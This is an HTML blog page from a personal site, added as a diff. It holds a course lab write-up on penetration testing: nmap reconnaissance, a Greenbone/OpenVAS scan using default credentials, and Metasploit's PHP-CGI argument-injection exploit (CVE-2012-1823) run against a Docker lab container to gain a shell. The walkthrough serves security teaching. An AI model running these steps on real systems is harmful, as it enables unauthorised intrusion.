@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html style="height: 100%;" lang="en">
+  <head>
+    <title>reo</title>
+<meta name="description" content="Leop homepage">
+
+<meta property="og:title" content="reo">
+<meta property="og:description" content="Leop homepage">
+
+<!-- <meta property="fb:app_id" content="260132667518211"> -->
+<!-- <link rel="apple-touch-icon" href="https://aidn.jp/apple-touch-icon.png"> -->
+<!-- <link rel="shortcut icon" href="https://aidn.jp/shared/icon/favicon.ico"> -->
+<!-- <link rel="alternate" media="handheld" href="https://aidn.jp/"> -->
+<!--
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://aidn.jp/shared/img/og/aidn.png">
+<meta name="twitter:site" content="@daniwell_aidn">
+
+<meta property="og:image" content="https://aidn.jp/shared/img/og/aidn.png">
+
+
+<link href='https://fonts.googleapis.com/css?family=PT+Sans:400,700,400italic,700italic|Source+Sans+Pro:400,700,200,300|Josefin+Sans:400,600,700,300' rel='stylesheet' type='text/css'>
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link rel="canonical" href="http://192.168.0.23:4000/">
+<link rel="alternate" type="application/rss+xml" title="Reo homepage" href="http://192.168.0.23:4000/feed.xml">
+-->
+
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">
+<meta property="og:locale" content="en_CA">
+<meta property="og:type" content="website">
+
+<meta name="theme-color" content="#000">
+<link rel="stylesheet" href="/assets/css/style.css">
+
+
+
+
+  </head>
+  <body style="position: relative; min-height: 100%; top: 0px;" class="dark ">
+    <nav id="nav_hp" class="sidenav collapse invert-color">
+  <!-- close button div
+  <div id="menu" style="display:block; width:100%">
+    <a href="javascript:void(0)" class="closebtn hide-large"
+				 style="line-height: 0.35; font-size:5.5vmax; margin-left:calc(6rem + 20vmin - 13vmax)"
+				 onclick="close_nav()">&times;</a>
+  </div>
+  -->
+  <!-- items div -->
+  <div id="menu" class="sidenav-items" style="display:block; width:100%">
+  
+  <p><a href="/" >TOP</a></p>
+  
+  <p><a href="/about.html" >ABOUT</a></p>
+  
+  <p><a href="/blog.html" >BLOG</a></p>
+  
+  </div>
+</nav>
+<div class="overlay hide-large" onclick="close_nav()" style="cursor:pointer"
+				title="close side menu" id="overlay"></div>
+<span class="hide-large" style="font-size:30px; cursor:pointer; position:fixed; top:3vh; left:1.2vw" onclick="open_nav()">&#9776;</span>
+<script>
+	// Open and close sidebar
+	function open_nav() {
+		document.getElementById("nav_hp").style.width = "calc(6rem + 20vmin)";
+		document.getElementById("overlay").style.display = "block";
+	}
+	function close_nav() {
+		document.getElementById("nav_hp").style.width = "0px";
+		document.getElementById("overlay").style.display = "none";
+	}
+</script>
+<!--
+	<p><a href="http://192.168.0.52:4000">TOP</a></p>
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
+-->
+
+    <div class="hp-contents">
+      <h2 class="title">Elementary Penetration Testing</h2>
+      <div class="-container">
+        <div class="-content focus-content">
+
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="post-content" itemprop="articleBody">
+    <p>In this lab, we experiment with classical penetration testing techniques using tools
+such as nmap, OpenVas, and Metasploit.</p>
+
+<p>(This post has been updated December 22nd to add images)</p>
+
+<h2 class="no_toc" id="contents">Contents</h2>
+
+<ul id="markdown-toc">
+  <li><a href="#setup" id="markdown-toc-setup">Setup</a></li>
+  <li><a href="#reconnaissance" id="markdown-toc-reconnaissance">Reconnaissance</a></li>
+  <li><a href="#using-greenbone" id="markdown-toc-using-greenbone">Using Greenbone</a></li>
+  <li><a href="#running-the-metasploit-module" id="markdown-toc-running-the-metasploit-module">Running the Metasploit Module</a>    <ul>
+      <li><a href="#credits" id="markdown-toc-credits">Credits</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="setup">Setup</h2>
+
+<hr />
+
+<p>Our system this time around is</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3'</span>
+
+<span class="na">services</span><span class="pi">:</span>
+  <span class="na">alice</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">alice</span>
+    <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+    <span class="na">networks</span><span class="pi">:</span>
+      <span class="na">channel</span><span class="pi">:</span>
+        <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.2</span>
+
+  <span class="na">nmap</span><span class="pi">:</span>
+      <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+      <span class="na">container_name</span><span class="pi">:</span> <span class="s">nmap</span>
+      <span class="na">stdin_open</span><span class="pi">:</span> <span class="no">true</span>
+      <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+      <span class="na">networks</span><span class="pi">:</span>
+        <span class="na">channel</span><span class="pi">:</span>
+          <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.3</span>
+
+  <span class="na">metasploit</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="s">strm/metasploit</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">metasploit</span>
+    <span class="na">stdin_open</span><span class="pi">:</span> <span class="no">true</span>
+    <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+    <span class="na">networks</span><span class="pi">:</span>
+      <span class="na">channel</span><span class="pi">:</span>
+        <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.4</span>
+
+  <span class="na">openvas</span><span class="pi">:</span>
+      <span class="na">image</span><span class="pi">:</span> <span class="s">mikesplain/openvas</span>
+      <span class="na">container_name</span><span class="pi">:</span> <span class="s">openvas</span>
+      <span class="na">ports</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="s2">"</span><span class="s">443:443"</span>
+      <span class="na">networks</span><span class="pi">:</span>
+        <span class="na">channel</span><span class="pi">:</span>
+          <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.5</span>
+             
+<span class="na">networks</span><span class="pi">:</span>
+  <span class="na">channel</span><span class="pi">:</span>
+    <span class="na">driver</span><span class="pi">:</span> <span class="s">bridge</span>
+    <span class="na">ipam</span><span class="pi">:</span>
+      <span class="na">config</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="na">subnet</span><span class="pi">:</span> <span class="s">10.0.0.0/24</span>
+</code></pre></div></div>
+
+<p>The target system is Alice so we start the container:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker-compose up -d alice
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<hr />
+
+<p>We first do some reconnaissance getting information such as
+OS fingerprinting using nmap:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker-compose up -d nmap
+$ docker exec -it nmap bash
+</code></pre></div></div>
+
+<p>in this interactive shell, we can run</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -O -sV -p0-4096
+</code></pre></div></div>
+
+<p>where we use</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-O</code> to enable OS detection</li>
+  <li><code class="language-plaintext highlighter-rouge">-sV</code> get service/version info on ports checked</li>
+  <li><code class="language-plaintext highlighter-rouge">p0-4096</code> to check ports 0 to 4096</li>
+</ul>
+
+<p>our output is</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.60 ( https://nmap.org ) at 2020-12-22 01:30 UTC
+Nmap scan report for alice.penet-testing_channel (10.0.0.2)
+Host is up (0.00011s latency).
+Not shown: 4094 closed ports
+PORT     STATE SERVICE     VERSION
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+1099/tcp open  rmiregistry GNU Classpath grmiregistry
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+MAC Address: 02:42:0A:00:00:02 (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=12/22%OT=80%CT=1%CU=36757%PV=Y%DS=1%DC=D%G=Y%M=02420A%
+OS:TM=5FE14C52%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%TS=
+OS:A)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B
+OS:4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W
+OS:1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%
+OS:O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=
+OS:N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A
+OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%D
+OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL
+OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: Host: localhost
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.51 seconds
+</code></pre></div></div>
+
+<p>We can also use greenbone to scan for vulnerabilities. In a separate terminal we run</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker-compose up openvas
+</code></pre></div></div>
+
+<p>Once it completes go to <code class="language-plaintext highlighter-rouge">https://localhost</code> and you will be greeted with the following screen.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/images/pentest1.png" alt="pt1" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Greenbone greeting screen</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="using-greenbone">Using Greenbone</h2>
+
+<hr />
+
+<p>The default login is <code class="language-plaintext highlighter-rouge">admin</code> for both fields and we reach the main interface.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/images/pentest2.png" alt="pt2" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Greenbone main interface</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>We navigate to Scans &gt; Tasks and use the task wizard to scan the target (10.0.0.2).</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/images/pentest3.png" alt="pt3" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Greenbone tasks screen</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Once completed, checking our report (under Scans &gt; Reports) we see there are several
+high severity vulnerabilities. In order to study these further, we export the report.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/images/pentest4.png" alt="pt4" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Greenbone reports screen</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="running-the-metasploit-module">Running the Metasploit Module</h2>
+
+<hr />
+
+<p>In the report, we notice a few things including a weak password but for the purpose of
+this exercise we will focus on vulnerability present in the CGI module of PHP.
+In the report we see a few CVE references including <code class="language-plaintext highlighter-rouge">CVE-2012-1823</code>.</p>
+
+<p>We can look up this reference on <a href="https://www.cvedetails.com/">CVE details</a>
+and find <a href="https://www.cvedetails.com/cve/CVE-2012-1823">the page</a>
+containing information we’re interested in.</p>
+
+<p>On it, we find a reference to a metasploit module to exploit this
+vulnerability <code class="language-plaintext highlighter-rouge">exploit/multi/http/php_cgi_arg_injection</code>. We can now proceed
+to run this exploit. First, run the container used to execute the exploit</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker-compose run metasploit
+</code></pre></div></div>
+
+<p>you should have an interface similar to</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cowsay++
+ ____________
+&lt; metasploit &gt;
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+
+       =[ metasploit v5.0.6-dev-eeed14d                   ]
++ -- --=[ 1856 exploits - 1052 auxiliary - 326 post       ]
++ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
+
+msf5 &gt;
+</code></pre></div></div>
+
+<p>from here, we load the exploit module</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; use exploit/multi/http/php_cgi_arg_injection
+</code></pre></div></div>
+
+<p>check the required options</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit(multi/http/php_cgi_arg_injection) &gt; show options
+
+Module options (exploit/multi/http/php_cgi_arg_injection):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   PLESK        false            yes       Exploit Plesk
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                        yes       The target address range or CIDR identifier
+   RPORT        80               yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
+   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
+   VHOST                         no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+</code></pre></div></div>
+
+<p>Here, all the required settings look fine except the target address which is not set.
+That can be quickly remedied</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit(multi/http/php_cgi_arg_injection) &gt; set RHOST 10.0.0.2
+RHOST =&gt; 10.0.0.2
+</code></pre></div></div>
+
+<p>now we’re all set and can run the exploit</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; exploit
+</code></pre></div></div>
+
+<p>This opens a Meterpreter session. To open a shell, we can simply type</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; shell
+</code></pre></div></div>
+
+<p>and a shell is created. We have successfully broken into the target</p>
+
+<p>When you’re done, don’t forget to <a href="/crypto/2020/10/08/05-lab.html#docker-cleanup">clean up</a>
+after Docker.</p>
+
+<hr />
+
+<h3 id="credits">Credits</h3>
+
+<hr />
+
+<p>These labs and exercises were provided as a part of a course in Security
+taught in 2019 by
+<a href="https://thierrysans.me/">Thierry Sans</a>.
+Credit for creation of these exercises and
+Docker images/containers goes to their respective creators.</p>
+
+<p>Docker images, urls, etc. are kept private
+to prevent abuse but if interested please
+contact.</p>
+
+
+  </div>
+</article>
+
+
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
